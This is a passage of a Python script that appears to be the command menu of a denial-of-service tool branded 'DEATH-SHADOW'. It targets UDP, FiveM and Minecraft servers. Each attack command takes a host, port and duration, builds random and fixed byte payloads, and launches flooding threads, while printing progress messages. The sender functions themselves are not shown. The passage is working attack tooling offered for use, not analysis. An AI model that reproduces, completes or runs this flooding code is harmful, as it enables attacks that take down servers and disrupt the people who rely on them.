					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-sas":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "fivem-sas":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "minecraft-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 1:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 1:
					attack = True

		else:
			main()

try:
	clear = "clear"
	os.system("cls")
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

